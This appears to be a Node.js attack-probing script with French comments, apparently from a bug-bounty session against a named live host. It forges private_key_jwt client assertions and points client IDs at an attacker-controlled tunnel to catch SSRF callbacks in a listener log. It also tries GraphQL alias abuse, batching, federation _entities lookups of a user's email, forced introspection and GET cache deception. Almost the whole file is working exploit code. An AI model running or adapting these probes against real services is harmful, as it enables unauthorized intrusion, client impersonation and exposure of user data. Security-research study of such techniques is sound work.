// (A) private_key_jwt : le doc a-t-il ete REJETE parce qu'il manquait le jwks_uri ?
//     -> si un doc avec private_key_jwt + jwks_uri valide est ACCEPTE, on teste l'ordre de
//        validation au /oauth/token (client-assertion avant ou apres le code ?) et, si l'AS
//        fetch le jwks_uri, c'est une SSRF de second ordre + une primitive d'usurpation de client.
// (B) GraphQL : alias abuse, batching, federation (_entities/_service)
import fs from "fs";
import crypto from "crypto";
const AS = "https://bugsecure-api.senintel.sn";
const EP = AS + "/graphql";
const TUN = fs.readFileSync("/tmp/opencode/tunnel_url2.txt", "utf8").trim();
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const form = (o) => Object.entries(o).map(([k, v]) => encodeURIComponent(k) + "=" + encodeURIComponent(v)).join("&");
const KEY = fs.readFileSync("/tmp/opencode/jwks-key.pem", "utf8");
const KID = "bb-probe-key-1";
const logLines = () => { try { return fs.readFileSync("/tmp/opencode/jwks-listener.log", "utf8").trim().split("\n").filter(Boolean); } catch { return []; } };
const b64u = (b) => Buffer.from(b).toString("base64url");
function assertion(clientId, aud) {
  const now = Math.floor(Date.now() / 1000);
  const si = b64u(JSON.stringify({ alg: "RS256", typ: "JWT", kid: KID })) + "." + b64u(JSON.stringify({ iss: clientId, sub: clientId, aud: aud || AS, jti: crypto.randomUUID(), iat: now, exp: now + 300 }));
  return si + "." + b64u(crypto.sign("RSA-SHA256", Buffer.from(si), KEY));
}
async function F(u, o = {}) { let e = null; for (let a = 0; a < 3; a++) { try { return await fetch(u, { ...o, signal: AbortSignal.timeout(30000) }); } catch (x) { e = x; await sleep(2000); } } return null; }
async function gql(query, variables, extra = {}) {
  const r = await F(EP, { method: "POST", headers: { "Content-Type": "application/json", ...extra }, body: typeof query === "string" ? query : JSON.stringify({ query, variables }) });
  const t = r ? await r.text() : "ERR";
  let j = null; try { j = JSON.parse(t); } catch {}
  return { s: r?.status ?? 0, j, t };
}

console.log("=== A) private_key_jwt : un doc avec jwks_uri EST-ACCEPTE ? ===");
for (const [lbl, path] of [["private_key_jwt + jwks_uri (ma cle)", "/doc/jwks-pk.json"], ["private_key_jwt SANS jwks_uri", "/doc/pk-nojwks.json"], ["none (temoin)", "/doc/nojwks.json"]]) {
  const clientId = TUN + path;
  const u = AS + "/oauth/authorize?" + form({ response_type: "code", client_id: clientId, redirect_uri: TUN + "/cb", scope: "programs:read profile:read reports:read reports:write", state: "bb-" + Date.now(), code_challenge: "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM", code_challenge_method: "S256", resource: AS });
  const r = await F(u, { redirect: "manual" });
  const loc = r?.headers.get("location") || "";
  console.log("  " + lbl.padEnd(38) + "-> " + (loc.includes("/oauth/consent") ? "ACCEPTE (consentement)" : loc.replace("https://bugsecure.senintel.sn", "") || "ERR"));
  await sleep(1000);
}

console.log("\n=== A2) ordre de validation au /oauth/token (client-assertion vs code) ===");
for (const [lbl, path] of [["private_key_jwt + jwks_uri", "/doc/jwks-pk.json"], ["none (temoin)", "/doc/nojwks.json"]]) {
  const clientId = TUN + path;
  const before = logLines().length;
  const r = await F(AS + "/oauth/token", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: form({ grant_type: "authorization_code", code: "probe-code-bidon", redirect_uri: TUN + "/cb", client_id: clientId, client_assertion_type: "urn:ietf:params:oauth:client-assertion-type:jwt-bearer", client_assertion: assertion(clientId, AS), resource: AS, code_verifier: "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM" }) });
  const txt = r ? await r.text() : "ERR";
  const newL = logLines().slice(before);
  console.log("  " + lbl.padEnd(38) + "HTTP " + (r?.status ?? 0) + " | " + txt.replace(/\s+/g, " ").slice(0, 140));
  console.log("      requete(s) vers mon serveur: " + newL.length + (newL.length ? " -> " + newL[0].slice(0, 130) : ""));
  await sleep(1200);
}

console.log("\n=== B) GraphQL : alias abuse ===");
const tests = [
  ["alias simple", `{ a: me { id } b: me { id } }`],
  ["alias x20", Array.from({ length: 20 }, (_, i) => `a${i}: me { id }`).join(" ")],
  ["meme champ 3 alias + arguments differents", `{ a: me { id } b: me { id } c: me { id email } }`],
  ["federation _service", `{ _service { sdl } }`],
  ["federation _entities", `{ _entities(representations: [{__typename:"User", id:"e3aa51e2-2c87-4b64-a3cb-6d5eb857f40c"}]) { ... on User { id username email } } }`],
  ["__typename direct", `{ __typename }`],
  ["schema via __type", `{ __type(name:"User"){ name fields { name } } }`],
  ["introspection forcee", `{ __schema { types { name } } }`],
];
for (const [lbl, q] of tests) {
  const r = await gql(q);
  const e = r.j?.errors ? "ERR: " + r.j.errors.map((x) => x.message).join(" | ") : JSON.stringify(r.j?.data);
  console.log("  " + lbl.padEnd(42) + "HTTP " + r.s + "  " + e.slice(0, 160));
  await sleep(700);
}

console.log("\n=== B2) GraphQL : batching (plusieurs operations dans une requete HTTP) ===");
const batch = JSON.stringify([{ query: "{ me { id } }" }, { query: "{ __typename }" }, { query: "{ me { id } }" }]);
const rb = await gql(batch);
console.log("  array de 3 operations      HTTP " + rb.s + "  " + (rb.j ? JSON.stringify(rb.j).slice(0, 200) : rb.t.slice(0, 200)));
const batch2 = `{ a: me { id } }\n{ b: me { id } }`;
const rb2 = await gql(batch2);
console.log("  2 operations dans 1 corps  HTTP " + rb2.s + "  " + (rb2.j ? JSON.stringify(rb2.j).slice(0, 200) : rb2.t.slice(0, 200)));
await sleep(600);

console.log("\n=== B3) requetes GET sur /graphql (cache deception) ===");
const g1 = await F(EP + "?query=" + encodeURIComponent("{ me { id email } }"));
const gt = g1 ? await g1.text() : "ERR";
console.log("  GET /graphql?query={me{id email}}  HTTP " + (g1?.status ?? 0) + "  " + gt.replace(/\s+/g, " ").slice(0, 160));
const g2 = await F(EP + "?query=" + encodeURIComponent("{ __typename }"));
const gt2 = g2 ? await g2.text() : "ERR";
console.log("  GET /graphql?query={__typename}    HTTP " + (g2?.status ?? 0) + "  " + gt2.replace(/\s+/g, " ").slice(0, 160));
